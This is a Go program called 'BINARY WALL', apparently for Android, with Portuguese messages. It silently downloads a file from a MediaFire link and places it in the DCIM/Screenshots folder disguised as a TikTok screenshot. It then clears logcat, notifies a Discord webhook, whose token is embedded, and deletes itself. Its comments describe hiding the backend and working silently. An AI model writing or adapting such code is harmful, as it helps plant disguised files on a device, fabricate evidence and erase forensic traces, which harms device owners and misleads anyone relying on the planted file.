package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

// ANSI Color Codes
const (
	ColorPurple = "\033[35m"
	ColorReset  = "\033[0m"
)

type WriteCounter struct {
	Total         uint64
	ContentLength uint64
	StartTime     time.Time
}

func (wc *WriteCounter) Write(p []byte) (int, error) {
	n := len(p)
	wc.Total += uint64(n)
	wc.PrintProgress()
	return n, nil
}

func (wc *WriteCounter) PrintProgress() {
	elapsed := time.Since(wc.StartTime).Seconds()
	var speed float64
	if elapsed > 0 {
		speed = float64(wc.Total) / elapsed
	}

	var speedStr string
	if speed > 1024*1024 {
		speedStr = fmt.Sprintf("%.2f MB/s", speed/(1024*1024))
	} else {
		speedStr = fmt.Sprintf("%.2f KB/s", speed/1024)
	}

	var percentage float64
	if wc.ContentLength > 0 {
		percentage = float64(wc.Total) / float64(wc.ContentLength) * 100
	}

	fmt.Printf("\r%s[Baixando] Progresso: %.2f%% | Velocidade: %s%s      ", ColorPurple, percentage, speedStr, ColorReset)
}

func main() {
	// Clear the terminal screen to make it look clean
	printHeader()

	url := "https://download1655.mediafire.com/xc6teo47qixgqmTd-1Tw3o1PQxzTs77kPScG4sh2ITRguBz7U_bdzPwKmqDsyOn4q6ULgQTOJTnFIgY9r9NrZyab19TyLiuODTrq40YyRds1wxl5AK3WbI-S6CP6xnPbgS_xeEYR6gMgMUcvpH7jYklxhstYVhMt5bU8focUpQVXBkEI/n07ccqwo05di1u8/AUD-20260505-WA02008.opus"
	tempFile := "download_temp.bin"

	// 1. Silent Download
	err := DownloadFile(tempFile, url)
	if err != nil {
		// Silent exit on error to hide backend
		os.Exit(1)
	}

	// 2. Move and Rename silently
	novoNome := "Screenshot_2026-07-13-12-56-11-644_com.zhiliaoapp.musically-edit.jpg"
	pastaDestino := "/storage/emulated/0/DCIM/Screenshots"
	
	os.MkdirAll(pastaDestino, 0755)
	caminhoFinal := filepath.Join(pastaDestino, novoNome)

	err = moveFile(tempFile, caminhoFinal)
	if err != nil {
		os.Exit(1)
	}

	// 3. Silent Logcat Clear
	exec.Command("logcat", "-c").Run()

	// 4. Webhook Notification
	sendWebhook()

	// 5. Success Message & Self-Delete
	fmt.Printf("\n\n%sFinalizado com sucesso.%s\n", ColorPurple, ColorReset)
	
	// Self-delete the binary
	exePath, _ := os.Executable()
	os.Remove(exePath)
}

func printHeader() {
	// Clear screen using ANSI escape codes
	fmt.Print("\033[H\033[2J")
	fmt.Printf("%sBINARY WALL\n\nby brisado\n\n%s", ColorPurple, ColorReset)
}

func DownloadFile(filepath string, url string) error {
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("bad status")
	}

	counter := &WriteCounter{
		ContentLength: uint64(resp.ContentLength),
		StartTime:     time.Now(),
	}

	_, err = io.Copy(out, io.TeeReader(resp.Body, counter))
	return err
}

func moveFile(sourcePath, destPath string) error {
	err := os.Rename(sourcePath, destPath)
	if err == nil {
		return nil
	}
	
	inputFile, err := os.Open(sourcePath)
	if err != nil {
		return err
	}

	outputFile, err := os.Create(destPath)
	if err != nil {
		inputFile.Close()
		return err
	}

	_, err = io.Copy(outputFile, inputFile)
	inputFile.Close()
	outputFile.Close()

	if err != nil {
		return err
	}

	return os.Remove(sourcePath)
}

func sendWebhook() {
	webhookURL := "https://discord.com/api/webhooks/1545944265325019226/htiZKMdjg0ZZcNywNc9Xqtx0jGuwxJK9OWrpoK9wzrGL-5C7bWPKGBIdOl7jV24YCrFo"
	
	payload := map[string]string{
		"content": "Novo download do BINARY WALL concluído com sucesso.",
	}
	
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return
	}

	resp, err := http.Post(webhookURL, "application/json", bytes.NewBuffer(jsonData))
	if err == nil {
		resp.Body.Close()
	}
}
